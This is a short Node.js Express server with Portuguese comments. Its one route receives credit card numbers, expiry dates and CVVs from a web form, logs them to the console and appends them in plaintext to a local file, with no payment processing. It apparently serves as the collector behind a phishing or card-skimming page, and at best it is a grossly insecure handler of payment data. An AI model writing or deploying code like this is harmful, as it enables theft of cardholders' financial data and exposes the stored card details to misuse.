const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Permite que o frontend acesse o backend
app.use(cors());
app.use(express.json());

// Define a pasta pública onde estão os arquivos estáticos
app.use(express.static(path.join(__dirname, 'public')));

// Rota de envio de dados do formulário
app.post('/enviar', (req, res) => {
  const data = req.body;

  // Log no terminal para debug
  console.log('Dados recebidos:', data);

  const log = `
Número do Cartão: ${data['card-number']}
Validade: ${data.validade}
CVV: ${data.cvv}
-----------------------------
`;

  fs.appendFile('dados.txt', log, (err) => {
    if (err) {
      console.error('Erro ao salvar:', err);
      return res.status(500).json({ message: 'Erro ao salvar dados' });
    }
    res.status(200).json({ message: 'Dados recebidos com sucesso!' });
  });
});

// Inicia o servidor
app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});
